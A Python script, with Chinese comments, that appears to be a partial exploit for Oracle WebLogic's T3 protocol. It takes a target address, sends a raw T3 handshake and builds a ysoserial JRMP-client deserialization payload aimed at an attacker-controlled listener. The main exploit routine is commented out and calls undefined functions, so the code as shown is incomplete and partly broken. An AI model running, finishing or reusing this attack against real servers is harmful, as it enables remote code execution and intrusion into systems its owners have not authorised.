
    # b't3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n'
    # t3 12.2.1
    # AS:225
    # HL:19
    # MS:1000000


# def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):
#     sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     # 通信链的句柄
#     sk.settimeout(65)
#     # 设置套接字操作的超时期
#     server_addr = (dip, dport)
#     # 定义元组
#     t3_handshake(sk, server_addr)
#     # 
#     build_t3_request_object(sock, dport)
#     payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)
#     print("payload: " + payload)
#     rs=send_payload_objdata(sock, payload)
#     print('response: ' + rs)
#     print('exploit completed!')


from __future__ import print_function

import binascii
import os
import socket
import sys
import time

def t3_handshake(sock, server_addr):
    sock.connect(server_addr)
    # 连接到address处的套接字。一般，address的格式为元组（hostname,port）,如果连接出错，返回socket.error错误。
    str = '74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'
    str_bytes = bytes.fromhex(str)
    sock.send(str_bytes)
    time.sleep(1)
    sock.recv(1024)
    # 接受套接字的数据。数据以字符串形式返回，bufsize指定最多可以接收的数量。flag提供有关消息的其他信息，通常可以忽略。
    print('handshake successful')

def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):
    #generates ysoserial payload
    command = 'java -jar {} {} {}:{} > payload.out'.format(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)
    print("command: " + command)
    os.system(command)
    bin_file = open('payload.out','rb').read()
    return binascii.hexlify(bin_file)

def exploit(dip, dport):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # 通信链的句柄
    sock.settimeout(65)
    # 设置套接字操作的超时期
    server_addr = (dip, dport)
    # 定义元组
    t3_handshake(sock, server_addr)


dip = sys.argv[1]
dport = int(sys.argv[2])
path_ysoserial = sys.argv[3]
jrmp_listener_ip = sys.argv[4]
jrmp_listener_port = sys.argv[5]
jrmp_client = sys.argv[6]
# exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)
exploit(dip, dport)